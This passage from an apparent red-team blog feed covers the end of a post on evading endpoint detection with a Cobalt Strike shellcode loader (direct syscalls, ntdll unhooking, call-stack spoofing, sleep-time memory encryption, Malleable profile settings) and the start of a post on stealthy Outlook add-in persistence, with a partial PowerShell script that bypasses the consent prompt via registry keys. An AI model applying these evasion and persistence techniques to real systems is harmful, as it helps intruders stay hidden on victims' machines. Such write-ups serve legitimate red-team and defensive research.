&lt;p&gt;The loader I’ve build does not inject the shellcode into another process but instead starts the shellcode in a thread in its own process space using &lt;code class=&quot;highlighter-rouge&quot;&gt;NtCreateThread&lt;/code&gt;. An unknown process (our binary will de facto have low prevalence) into other processes (typically a Windows native ones) is suspicious activity that stands out (recommended read &lt;a href=&quot;https://www.cobaltstrike.com/blog/cobalt-strike-4-5-fork-run-youre-history/&quot;&gt;“Fork&amp;amp;Run – you’re history”&lt;/a&gt;). It is much easier to blend into the noise of benign thread executions and memory operations within a process when we run the shellcode within a thread in the loader’s process space. The downside however is that any crashing post-exploitation modules will also crash the process of the loader and therefore the implant. Persistence techniques as well as running stable and reliable &lt;a href=&quot;https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm&quot;&gt;BOFs&lt;/a&gt; can help to overcome this downside.&lt;/p&gt;

&lt;h3 id=&quot;7-direct-system-calls-and-evading-mark-of-the-syscall&quot;&gt;7. Direct system calls and evading “mark of the syscall”&lt;/h3&gt;
&lt;p&gt;The loader leverages direct system calls for bypassing any hooks put in &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; by the EDRs. I want to avoid going into too much detail on how direct syscalls work, since it’s not the purpose of this post and a lot of great posts have been written about it (e.g. &lt;a href=&quot;https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/&quot;&gt;Outflank&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;In short, a direct syscall is a WINAPI call directly to the kernel system call equivalent. Instead of calling the &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;VirtualAlloc&lt;/code&gt; we call its kernel equivalent &lt;code class=&quot;highlighter-rouge&quot;&gt;NtAloocateVirtualMemory&lt;/code&gt; defined in the Windows kernel. This is great because we’re bypassing any EDR hooks used to monitor calls to (in this example) &lt;code class=&quot;highlighter-rouge&quot;&gt;VirtualAlloc&lt;/code&gt; defined in &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;In order to call a system call directly, we fetch the syscall ID of the system call we want to call from &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt;, use the function signature to push the correct order and types of function arguments to the stack, and call the &lt;code class=&quot;highlighter-rouge&quot;&gt;syscall &amp;lt;id&amp;gt;&lt;/code&gt; instruction. There are several tools that arrange all this for us, &lt;a href=&quot;https://github.com/jthuraisamy/SysWhispers2&quot;&gt;SysWhispers2&lt;/a&gt; and &lt;a href=&quot;https://github.com/klezVirus/SysWhispers3&quot;&gt;SysWhisper3&lt;/a&gt; are two great examples. From an evasion perspective, there are two issues with calling direct system calls:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Your binary ends up with having the &lt;code class=&quot;highlighter-rouge&quot;&gt;syscall&lt;/code&gt; instruction, which is easy to detect statically (a.k.a “mark of the syscall”, more in “&lt;a href=&quot;https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/&quot;&gt;SysWhispers is dead, long live SysWhispers!&lt;/a&gt;”).&lt;/li&gt;
  &lt;li&gt;Unlike benign use of a system call that is called through its &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; equivalent, the return address of the system call does not point to &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt;. Instead, it points to our code from where we called the syscall, which resides in memory regions outside of &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt;. This is an indicator of a system call that is not called through &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt;, which is very suspicious.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;To overcome these issues we can do the following:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Implement an egg hunter mechanism. Replace the &lt;code class=&quot;highlighter-rouge&quot;&gt;syscall&lt;/code&gt; instruction with the &lt;code class=&quot;highlighter-rouge&quot;&gt;egg&lt;/code&gt; and at runtime, search for this &lt;code class=&quot;highlighter-rouge&quot;&gt;egg&lt;/code&gt; in memory and replace it with the &lt;code class=&quot;highlighter-rouge&quot;&gt;syscall&lt;/code&gt; instruction using the &lt;code class=&quot;highlighter-rouge&quot;&gt;ReadProcessMemory&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;WriteProcessMemory&lt;/code&gt; WINAPI calls. This technique has been implemented by &lt;a href=&quot;https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/&quot;&gt;klezVirus&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;Instead of calling the &lt;code class=&quot;highlighter-rouge&quot;&gt;syscall&lt;/code&gt; instruction from our own code, we search for the &lt;code class=&quot;highlighter-rouge&quot;&gt;syscall&lt;/code&gt; instruction in &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; and jump to that memory address once we’ve prepared the stack to call the system call. This will result in an return address in RIP that points to &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; memory regions.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Both techniques are part of &lt;a href=&quot;https://github.com/klezVirus/SysWhispers3&quot;&gt;SysWhisper3&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;8-removing-hooks-in-ntdlldll&quot;&gt;8. Removing hooks in &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;Another nice technique to evade EDR hooks in &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; is to overwrite the loaded &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; that is loaded by default (and hooked by the EDR) a fresh copy from &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; in memory. &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; is the first DLL that gets loaded by any Windows process. EDR solutions make sure their DLL comes shortly after, which puts all the hooks in place in the loaded &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt;, before our own code will execute. If our code loads a new copy of &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; in memory, those EDR hooks will be overwritten. &lt;a href=&quot;https://github.com/hlldz/RefleXXion&quot;&gt;RefleXXion&lt;/a&gt; is a C++ library that implements the research done for this technique by &lt;a href=&quot;https://www.mdsec.co.uk/2022/01/edr-parallel-asis-through-analysis/&quot;&gt;MDSec&lt;/a&gt;. RelfeXXion uses direct system calls &lt;code class=&quot;highlighter-rouge&quot;&gt;NtOpenSection&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;NtMapViewOfSection&lt;/code&gt; to get a handle to a clean &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;\KnownDlls\ntdll.dll&lt;/code&gt; (registry path with previously loaded DLLs). It then overwrites the &lt;code class=&quot;highlighter-rouge&quot;&gt;.TEXT&lt;/code&gt; section of the loaded &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt;, which flushes out the EDR hooks.&lt;/p&gt;

&lt;p&gt;I recommend to use adjust the RefleXXion library to use the same trick as described above in section 7.&lt;/p&gt;

&lt;h3 id=&quot;9-spoofing-the-thread-call-stack&quot;&gt;9. Spoofing the thread call stack&lt;/h3&gt;
&lt;p&gt;The next two sections cover two techniques that provide evasions against detecting our shellcode in memory. Due to the beaconing behaviour of an implant, for a majority of the time the implant is sleeping, waiting for incoming tasks from its operator. During this time the implant is vulnerable for memory scanning techniques from the EDR. The first of the two evasions described in this post is spoofing the thread call stack.&lt;/p&gt;

&lt;p&gt;When the implant is sleeping, its thread return address is pointing to our shellcode residing in memory. By examining the return addresses of threads in a suspicious process, our implant shellcode can be easily identified. In order to avoid this, want to break this connection between the return address and shellcode. We can do so by hooking the &lt;code class=&quot;highlighter-rouge&quot;&gt;Sleep()&lt;/code&gt; function. When that hook is called (by the implant/beacon shellcode), we overwrite the return address with &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0&lt;/code&gt; and call the original &lt;code class=&quot;highlighter-rouge&quot;&gt;Sleep()&lt;/code&gt; function. When &lt;code class=&quot;highlighter-rouge&quot;&gt;Sleep()&lt;/code&gt; returns, we put the original return address back in place so the thread returns to the correct address to continue execution. &lt;a href=&quot;https://twitter.com/mariuszbit&quot;&gt;Mariusz Banach&lt;/a&gt; has implemented this technique in his &lt;a href=&quot;https://github.com/mgeeky/ThreadStackSpoofer&quot;&gt;ThreadStackSpoofer&lt;/a&gt; project. This repo provides much more detail on the technique and also outlines some caveats.&lt;/p&gt;

&lt;p&gt;We can observe the result of spoofing the thread call stack in the two screenshots below, where the non-spoofed calls stack points to non-backed memory locations and a spoofed thread call stack points to our hooked Sleep (&lt;code class=&quot;highlighter-rouge&quot;&gt;MySleep&lt;/code&gt;) function.&lt;/p&gt;

&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2022-04-18-blueprint-for-evading-edr-in-2022/thread-not-spoofed.png&quot; alt=&quot;&quot; width=&quot;300&quot; /&gt;&lt;/p&gt;
&lt;figcaption&gt;Default beacon thread call stack.&lt;/figcaption&gt;

&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2022-04-18-blueprint-for-evading-edr-in-2022/thread_spoofed.png&quot; alt=&quot;&quot; width=&quot;300&quot; /&gt;&lt;/p&gt;
&lt;figcaption&gt;Spoofed beacon thread call stack.&lt;/figcaption&gt;

&lt;h3 id=&quot;10--in-memory-encryption-of-beacon&quot;&gt;10.  In-memory encryption of beacon&lt;/h3&gt;
&lt;p&gt;The other evasion for in-memory detection is to encrypt the shellcode memory regions while sleeping. Using the same Sleep hook as described in the section above, we can obtain the shellcode memory page by examining the caller address (the beacon code that calls &lt;code class=&quot;highlighter-rouge&quot;&gt;Sleep()&lt;/code&gt; and therefore our &lt;code class=&quot;highlighter-rouge&quot;&gt;MySleep()&lt;/code&gt; hook). If the caller memory region is &lt;code class=&quot;highlighter-rouge&quot;&gt;MEM_PRIVATE&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;EXECUTABLE&lt;/code&gt; and roughly the size of our shellcode, then the memory page is encrypted with a XOR function and &lt;code class=&quot;highlighter-rouge&quot;&gt;Sleep()&lt;/code&gt; is called. Then &lt;code class=&quot;highlighter-rouge&quot;&gt;Sleep()&lt;/code&gt; returns, it decrypts the memory page and returns to it.&lt;/p&gt;

&lt;p&gt;Another technique is to register a Vectored Exception Handler (VEH) that handles &lt;code class=&quot;highlighter-rouge&quot;&gt;NO_ACCESS&lt;/code&gt; violation exceptions, decrypts the memory pages and changes the permissions to RX. Then just before sleeping, mark the memory pages as &lt;code class=&quot;highlighter-rouge&quot;&gt;NO_ACCESS&lt;/code&gt;, so that when &lt;code class=&quot;highlighter-rouge&quot;&gt;Sleep()&lt;/code&gt; returns, it throws a memory access violation exception. Because we registered a VEH, the exception is handled within that thread context and can be resumed at the exact same location the exception was thrown, the VEH can simply decrypt and change the permissions back to RX and the implant can continue execution. This technique prevents a detectible &lt;code class=&quot;highlighter-rouge&quot;&gt;Sleep()&lt;/code&gt; hook being in place when the implant is sleeping.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://twitter.com/mariuszbit&quot;&gt;Mariusz Banach&lt;/a&gt; has also implemented this technique in &lt;a href=&quot;https://github.com/mgeeky/ShellcodeFluctuation&quot;&gt;ShellcodeFluctuation&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;11-a-custom-reflective-loader&quot;&gt;11. A custom reflective loader&lt;/h3&gt;

&lt;p&gt;The beacon shellcode that we execute in this loader ultimately is a DLL that needs to be executed in memory. Many C2 frameworks leverage Stephen Fewer’s &lt;a href=&quot;https://github.com/stephenfewer/ReflectiveDLLInjection&quot;&gt;ReflectiveLoader&lt;/a&gt;. There are many well written explanations of how exactly a relfective loader works, and Stephen Fewer’s code is also well documented, but in short a Reflective Loader does the following:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Resolve addresses to necessary &lt;code class=&quot;highlighter-rouge&quot;&gt;kernel32.dll&lt;/code&gt; WINAPIs required for loading the DLL (e.g. &lt;code class=&quot;highlighter-rouge&quot;&gt;VirtualAlloc&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;LoadLibraryA&lt;/code&gt; etc.)&lt;/li&gt;
  &lt;li&gt;Write the DLL and its sections to memory&lt;/li&gt;
  &lt;li&gt;Build up the DLL import table, so the DLL can call &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;kernel32.dll&lt;/code&gt; WINAPIs&lt;/li&gt;
  &lt;li&gt;Load any additional library’s and resolve their respective imported function addresses&lt;/li&gt;
  &lt;li&gt;Call the DLL entrypoint&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Cobalt Strike added support for a custom defined way for reflectively loading a DLL in memory that allows a red team operator to customize the way a beacon DLL gets loaded, and add evasion techniques (UDRL). Bobby Cooke and Santiago P  built a stealthy loader (&lt;a href=&quot;https://github.com/boku7/BokuLoader&quot;&gt;BokuLoader&lt;/a&gt;) using Cobalt Strike’s UDRL which I’ve used in my loader. BokuLoader implements several evasion techniques:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Limit calls to &lt;code class=&quot;highlighter-rouge&quot;&gt;GetProcAddress()&lt;/code&gt; (commonly EDR hooked WINAPI call to resolve a function address, as we do in section 4)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal&quot;&gt;AMSI&lt;/a&gt; &amp;amp; ETW bypasses&lt;/li&gt;
  &lt;li&gt;Uses only direct system calls&lt;/li&gt;
  &lt;li&gt;Only uses &lt;code class=&quot;highlighter-rouge&quot;&gt;RW&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;RX&lt;/code&gt;, but no use of &lt;code class=&quot;highlighter-rouge&quot;&gt;RWX&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;EXECUTE_READWRITE&lt;/code&gt;) permissions&lt;/li&gt;
  &lt;li&gt;Removes beacon DLL headers from memory&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Make sure to uncomment &lt;a href=&quot;https://github.com/boku7/BokuLoader/blob/055861a12871e2e7f3396dcac67e8ee40c46d757/BokuLoader64.c#L4&quot;&gt;the two defines&lt;/a&gt; to leverage direct system calls via &lt;a href=&quot;https://blog.sektor7.net/#!res/2021/halosgate.md&quot;&gt;HellsGate &amp;amp; HalosGate&lt;/a&gt; and bypass ETW and AMSI (not really necessary, as we’ve already disabled ETW and are not injecting the loader into another process).&lt;/p&gt;

&lt;h3 id=&quot;12-opsec-configurations-in-your-malleable-profile&quot;&gt;12. OpSec configurations in your Malleable profile&lt;/h3&gt;

&lt;p&gt;In your Malleable C2 profile, make sure the following options are configured, which limit the use of &lt;code class=&quot;highlighter-rouge&quot;&gt;RWX&lt;/code&gt; marked memory pages (suspicious and easily detected) and clean up the shellcode after beacon has started.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    set startrwx        &quot;false&quot;;
    set userwx          &quot;false&quot;;
    set cleanup         &quot;true&quot;;
    set stomppe         &quot;true&quot;;
    set obfuscate       &quot;true&quot;;
    set sleep_mask      &quot;true&quot;;
    set smartinject     &quot;true&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;conclusions&quot;&gt;Conclusions&lt;/h3&gt;

&lt;p&gt;Combining these techniques allow you to (among others) bypass Microsoft Defender for Endpoint and CrowdStrike Falcon with 0 detections (tested mid April 2022), which together with SentinelOne lead the endpoint protection industry.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2022-04-18-blueprint-for-evading-edr-in-2022/crowdstrike-bypass.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;figcaption&gt;CrowdStrike Falcon with 0 alerts.&lt;/figcaption&gt;
&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2022-04-18-blueprint-for-evading-edr-in-2022/windef-bypass.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;figcaption&gt;Windows Defender (and also Microsoft Defender for Endpoint, not screenshotted) with 0 alerts.&lt;/figcaption&gt;

&lt;p&gt;Of course, this is just one and the first step in fully compromising an endpoint and this doesn’t mean “game over” for the EDR solution. Depending on what post-exploitation activity/modules the red team operator choses next, it can still be “game over” for the implant. In general, either run BOFs, or tunnel post-ex tools through the implant’s SOCKS proxy feature. Also consider putting the EDR hooks patches back in place in our &lt;code class=&quot;highlighter-rouge&quot;&gt;Sleep()&lt;/code&gt; hook to avoid detection of unhooking, as well as removing the ETW/AMSI patches.&lt;/p&gt;

&lt;p&gt;It’s a cat and mouse game, and the cat is undoubtedly getting better.&lt;/p&gt;</content><author><name>vivami</name></author><category term="blog" /><category term="Evasion" /><category term="Obfuscation" /><summary type="html">About two years ago I quit being a full-time red team operator. However, it still is a field of expertise that stays very close to my heart. A few weeks ago, I was looking for a new side project and decided to pick up an old red teaming hobby of mine: bypassing/evading endpoint protection solutions.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://vanmieghem.io/assets/images/headers/crowdstrike-defender-endpoint.png" /><media:content medium="image" url="https://vanmieghem.io/assets/images/headers/crowdstrike-defender-endpoint.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">An Outlook parasite for stealth persistence</title><link href="https://vanmieghem.io/stealth-outlook-persistence/" rel="alternate" type="text/html" title="An Outlook parasite for stealth persistence" /><published>2021-01-09T00:00:00+01:00</published><updated>2021-01-09T00:00:00+01:00</updated><id>https://vanmieghem.io/stealth-outlook-persistence</id><content type="html" xml:base="https://vanmieghem.io/stealth-outlook-persistence/">&lt;p&gt;In 2019 I was researching new “stealthy” persistence techniques that were not yet published or commonly known. I was triggered by the techniques that (mis)used plugins for programs on the target’s machine. Particularly interesting targets are browsers, e-mail clients and messaging apps, as they’re typically started after boot.&lt;/p&gt;

&lt;p&gt;While reading other’s work, I stumbled upon a blog post from &lt;a href=&quot;https://twitter.com/bohops&quot;&gt;@bohops&lt;/a&gt; about &lt;a href=&quot;https://bohops.com/2018/01/31/vsto-the-payload-installer-that-probably-defeats-your-application-whitelisting-rules/&quot;&gt;VSTOs: The Payload Installer That Probably Defeats Your Application Whitelisting Rules&lt;/a&gt;. He shows how to create an “evil VSTO” and install it into Office. His conclusion there however, is that an unprivileged account will get a (“ClickOnce”) pop-up from &lt;code class=&quot;highlighter-rouge&quot;&gt;vstoinstaller.exe&lt;/code&gt; asking the user for permission:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2021-01-08-stealth-outlook-persistence/1.png&quot; alt=&quot;Screenshot by @bohops&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bypassing this “ClickOnce” pop-up would be very valuable from an attacker perspective and so I decided to dig a bit deeper into how exactly &lt;code class=&quot;highlighter-rouge&quot;&gt;vstoinstaller.exe&lt;/code&gt; installs a VSTO add-in. I fired up Procmon and filtered on &lt;code class=&quot;highlighter-rouge&quot;&gt;vstoinstaller.exe&lt;/code&gt; process while clicking through this pop-up. I started by looking at the registry keys in &lt;code class=&quot;highlighter-rouge&quot;&gt;HKCU&lt;/code&gt;, since I assumed that would be a key part of the installation.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2021-01-08-stealth-outlook-persistence/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2021-01-08-stealth-outlook-persistence/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;These registry keys were particularly interesting and seemed very much related to the installation of the VSTO. I uninstalled the plugin again using &lt;code class=&quot;highlighter-rouge&quot;&gt;vstoinstaller.exe /uninstall&lt;/code&gt; which removed those particular registry keys.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2021-01-08-stealth-outlook-persistence/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Installing the VSTO again using the conventional method triggers the pop-up again, so I was assuming the uninstallation performed a complete roll-back of the VSTO install.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2021-01-08-stealth-outlook-persistence/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next I wrote a PowerShell script that set the correct registry keys and values to test if my Outlook add-in would be loaded by Outlook, without any user consent pop-ups. I think the trick of bypassing the “ClickOnce” pop-up eventually boils down to adding the public key of the certificate used to sign the VSTO with, in &lt;code class=&quot;highlighter-rouge&quot;&gt;HKCU:\Software\Microsoft\VSTO\Security\Inclusion\&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kr&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Install-OutlookAddin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;&amp;lt;#
    &lt;/span&gt;&lt;span class=&quot;cs&quot;&gt;.SYNOPSIS&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;

        Installs an Outlook add-in.
        Author: @_vivami

    &lt;/span&gt;&lt;span class=&quot;cs&quot;&gt;.PARAMETER&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt; PayloadPath

        The path of the DLL and manifest files

    &lt;/span&gt;&lt;span class=&quot;cs&quot;&gt;.EXAMPLE&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;

        PS&amp;gt; Install-OutlookAddin -PayloadPath C:\Path\to\Addin.vsto 
#&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;CmdletBinding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;Parameter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;Mandatory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PayloadPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RegistryPaths&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKCU:\Software\Microsoft\Office\Outlook\Addins\OutlookExtension&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKCU:\Software\Microsoft\VSTO\SolutionMetadata&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKCU:\Software\Microsoft\VSTO\SolutionMetadata\{FA2052FB-9E23-43C8-A0EF-43BBB710DC61}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKCU:\Software\Microsoft\VSTO\Security\Inclusion\1e1f0cff-ff7a-406d-bd82-e53809a5e93a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RegistryPaths&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-Not&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Test-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;New-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Out-Null&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Write-Error&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Failed to set entry &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
